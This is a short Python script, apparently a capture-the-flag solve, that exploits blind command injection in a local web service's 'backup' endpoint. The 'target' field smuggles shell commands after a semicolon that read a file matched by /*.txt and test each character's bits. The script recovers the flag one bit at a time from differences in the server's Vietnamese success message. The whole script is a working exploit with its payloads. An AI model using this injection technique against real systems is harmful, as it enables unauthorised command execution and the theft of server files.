from requests import post

url = "http://127.0.0.1:3005"

flag = ""

def binToChar(bin):
	return chr(int(bin, 2))

NULL = binToChar("011111")

for char_index in range(1, 50):
	char = ""
	payload = '''aa /etc/passwd; if [ $(expr length $(perl -e 'printf "%b",'$(printf "%d" \\'$(cat /*.txt | cut -c{0})))) = "7" ]; then echo "ok"; else echo "zip error"; fi; #'''.format(char_index)
	r = post(url, data={
		"command": "backup",
		"target": payload
	}).text
	bits = 6
	if "Backup thành công" in r:
		bits = 7 # co 7 bit
	for bit_index in range(1, bits+1):
		payload = '''aa /etc/passwd; if [ $(perl -e 'printf "%b",'$(printf "%d" \\'$(cat /*.txt | cut -c{0})) | cut -c{1}) = "0" ]; then echo "ok"; else echo "zip error"; fi; #'''.format(char_index, bit_index)
		r = post(url, data={
			"command": "backup",
			"target": payload
		}).text
		# print(payload)
		if "Backup thành công" in r:
			char += "0"
		else:
			char += "1"
		print(char)
	char = binToChar(char)
	if char == NULL:
		print("flag found => " + flag)
		exit()
	print("found char => " + char)
	flag += char 
